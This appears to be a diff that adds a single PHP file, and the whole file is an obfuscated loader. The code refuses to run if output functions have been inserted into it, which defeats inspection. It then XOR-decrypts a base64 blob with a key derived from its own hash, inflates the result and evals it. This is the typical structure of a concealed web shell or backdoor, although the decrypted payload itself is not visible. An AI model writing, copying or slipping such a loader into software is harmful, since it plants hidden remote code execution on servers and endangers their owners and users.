@@ -1,0 +1,24 @@
+<?php
+$orwohernam="b24d14a2f36a4e6d46ea7e702af10249";
+$zxzsqagay="5b56015d55075906555600510d060557570e510306545451535556575153520a";
+$esftxupfcwb="/DP+V78DKMgmM3Ohz0P4fQAshIE1iHeJwHSxeBtFTlkc1ZNx4pfEzMg3GY9bOqGg1S919LaCqLx4XkX5L3+2ztpmVMWVFT2adS919ssPV6qGSMdrDIuc4nORavYtOUsoXWV/BtMTC/Y3Q+e6MSghA1jONv1CVY/3ovbTqjne2sTUMvQ1/dSkXKvGuti9aqxwD1/cFJ0HEKX4NA9j98WI4l1QqELquYuzyNUTtQkED/GsAdC311dNH24YvqaxRzn0Rl39SqrbKrN3ErDoGOQ2++v6H2Taf51nWbhOo1kWa/FLYY9u/OA990SmchxCjpUzbZsT9vttO/1w1UKKj6hvzVzUFd6KKdJ+2QIPUptQf78SakIAHma0WzZJJobcxkx4YHZHefAI/PZoVNWRDOhfiZMe15O2c5DXqfKWgahUfqpSbgCY54Zbv+4PkByqgSMtNzn+KeU13HzuCXReKqWkkBlI3RtxpR38W9/GInQ3+VtDWCm2xfA01q6TQv1v7t9ADejjKU6cSUt1U0h51p8PHl4mfn+wR1y0Zy35P+W/Gbqf90Rl/g6IZaa2nH79KWYPLNeyFtefFAYXXph8MivHYWYv3LKmUzV+WT6rSIoV2i7AN1d/mY2GzdNiOuUouXNQthj0Zm2IktxCprEFwMpB45TidJ2Q+oRdHo39wc9eE1Nux5ySzeYB6SqCdDs30nCpD5SQqR/DcVXl4bkohq0AY+KFhwd/21PwINRjE73rKvaqTrIAP39maDAHBEuVkV0Er6Fu5rGZAB5VzWwO1nfsHEqbKzh3RBqu6ZupcZtpiVGR+/txlLxaSeA3im2Ro4bTaWOdHzOQd9iI1Zu1RCJp44wP0mjUg7+Q7u5EC0Fy4BS4Mpvyxwq83r3zingZXX8aqDhMGZ5Nr2g3rBawAWVZ+Bhk6QGYuAtyr+lbUztnw6FyGSFqJ8cPN+WmUVCvr47lnfIyD5tUe+N/ERzY6xTO4pFQLGEiyABYtHhcnUPkayLZ1Cgvv/HkUhA/CXdNQnCRBIvuMpJF4mnKs+GFagqvwCLROfJHrrdbLpDW1cs1EGS66vUEfjcjppqfJY9+YllJcLwI5REVIdlAnYihyoi3eu/fNwRucx1FUNW6gaKifsQ3TTSMAK9nhCbh83k=";
+$zwialvcdaz=file_get_contents(__FILE__);
+$skvlfjtuyl=str_replace($esftxupfcwb,"",$zwialvcdaz);
+if(strpos($skvlfjtuyl,"ec"."ho")!==false||strpos($skvlfjtuyl,"pr"."int")!==false||strpos($skvlfjtuyl,"var_"."dump")!==false||strpos($skvlfjtuyl,"file_put_"."contents")!==false||strpos($skvlfjtuyl,"fw"."rite")!==false){die();}
+$fhtdbiey=str_replace(array($orwohernam,$zxzsqagay),array("SP_d49f6478","KP_6a3758f7"),$zwialvcdaz);
+$okvexe=md5($fhtdbiey);
+$lksvjlfnce=hex2bin($zxzsqagay);
+$glovxbe="";
+$aplrhpc=strlen($okvexe);
+for($zorbyfy=0;$zorbyfy<$aplrhpc;$zorbyfy++){
+    $glovxbe.=chr(ord($lksvjlfnce[$zorbyfy])^ord($okvexe[$zorbyfy]));
+}
+$cxikejxw=base64_decode($esftxupfcwb);
+$nuszhf=strlen($cxikejxw);
+$fknozvdiwair="";
+$kwhqtozlthis=strlen($glovxbe);
+for($zorbyfy=0;$zorbyfy<$nuszhf;$zorbyfy++){
+    $fknozvdiwair.=$cxikejxw[$zorbyfy]^$glovxbe[$zorbyfy%$kwhqtozlthis];
+}
+$xpxtzazur="gz"."in"."fl"."ate";
+eval($xpxtzazur($fknozvdiwair));
